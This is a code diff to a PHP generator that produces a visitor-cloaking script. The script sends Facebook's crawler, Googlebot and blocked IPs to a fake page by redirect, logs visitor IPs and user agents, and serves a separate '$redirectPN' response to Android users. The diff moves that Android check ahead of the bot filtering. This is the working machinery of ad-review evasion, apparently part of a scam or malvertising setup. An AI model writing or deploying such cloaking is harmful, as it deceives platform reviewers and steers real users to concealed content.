@@ -234,6 +234,11 @@ $blockedAgents = "blockedAgents' . $pathname . '.txt";
 
 $ip = ip2long($_SERVER[\'REMOTE_ADDR\']);
 
+if (strpos($_SERVER["HTTP_USER_AGENT"], "android") !== false) {
+  echo "' . $redirectPN . '";
+  die();
+}
+
 if (
     strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
     strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
@@ -244,9 +249,6 @@ if (
     fclose($fAgent);
     header(\'Location: ' . $linkHtmlFake . '\', true, 301);
     die();
-} elseif (strpos($_SERVER["HTTP_USER_AGENT"], "android") !== false) {
-  echo "' . $redirectPN . '";
-  die();
 } else {
     $fAgent = fopen($allowedAgents, \'a\');
     $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] . \' ok \' . PHP_EOL;
